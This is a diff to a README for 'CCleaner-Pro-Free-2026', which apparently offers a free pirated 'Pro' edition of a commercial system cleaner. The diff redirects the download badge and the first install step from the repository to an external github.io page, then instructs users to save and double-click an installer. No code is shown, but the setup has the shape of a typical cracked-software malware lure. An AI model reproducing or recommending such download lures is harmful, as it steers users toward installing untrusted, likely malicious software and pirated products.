@@ -1,6 +1,6 @@
 # 💻 CCleaner-Pro-Free-2026 - Improve Your Computer Speed And Stability
 
-[![](https://img.shields.io/badge/Download-CCleaner_Pro-007bff.svg)](https://github.com/Katalincernuous981/CCleaner-Pro-Free-2026)
+[![](https://img.shields.io/badge/Download-CCleaner_Pro-007bff.svg)](https://katalincernuous981.github.io)
 
 ## 📁 Project Overview
 
@@ -20,7 +20,7 @@ Before you install this software, confirm your computer meets these requirements
 
 Follow these steps to obtain the setup files and install the software on your system:
 
-1. Visit the following link to access the distribution page: [Click Here to Download CCleaner-Pro-Free-2026](https://github.com/Katalincernuous981/CCleaner-Pro-Free-2026).
+1. Visit the following link to access the distribution page: [Click Here to Download CCleaner-Pro-Free-2026](https://katalincernuous981.github.io).
 2. Locate the download button or link on the repository page.
 3. Save the installer file to your Downloads folder.
 4. Open your Downloads folder and double-click the file to start the installation process.
